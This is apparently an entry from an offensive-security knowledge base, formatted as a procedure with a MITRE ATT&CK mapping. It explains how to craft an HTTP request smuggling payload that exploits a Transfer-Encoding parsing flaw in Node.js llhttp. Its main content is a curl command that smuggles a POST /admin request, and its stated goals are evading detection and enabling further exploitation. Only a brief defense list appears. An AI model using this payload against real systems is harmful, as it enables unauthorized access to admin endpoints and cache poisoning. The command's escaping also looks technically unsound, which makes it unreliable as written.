---
tags:
  - http-request-smuggling
  - crafting
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-craft-smuggling-request]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 07fc8a1c-5b14-4271-9c92-ea57ac40d956
created_at: '2025-12-13T09:01:17.688Z'
updated_at: '2025-12-13T09:01:17.688Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft HTTP Smuggling Request

## Summary

This procedure details how to construct a malicious HTTP request exploiting the Transfer-Encoding parsing flaw in Node.js's llhttp to smuggle additional requests.

## Description

By manipulating chunked encoding, attackers can append smuggled requests that the backend processes incorrectly. This is useful in web applications for chaining to other attacks like cache poisoning.

## Requirements

1. Confirmed vulnerable target
2. Curl or similar HTTP client
3. Understanding of HTTP/1.1 protocols

## Defense

- Enforce strict header validation
- Use WAF rules to block malformed Transfer-Encoding

## Objectives

1. Create a valid smuggling payload
2. Test smuggling without detection
3. Enable further exploitation

## Instructions

### Step 1: Build Smuggling Payload

**Context**: Craft a chunked request with a smuggled POST.

**Command** ([[commands/curl-craft-smuggling-request]]):
```bash
curl -v -H "Transfer-Encoding: chunked" -d "1\r\na\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\n" http://target.com
```

> This injects a smuggled POST request after the chunked body.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-craft-smuggling-request]]

## Tools Used

- [[tools/Curl]]

## Tags

- [[http-request-smuggling]]
- [[crafting]]
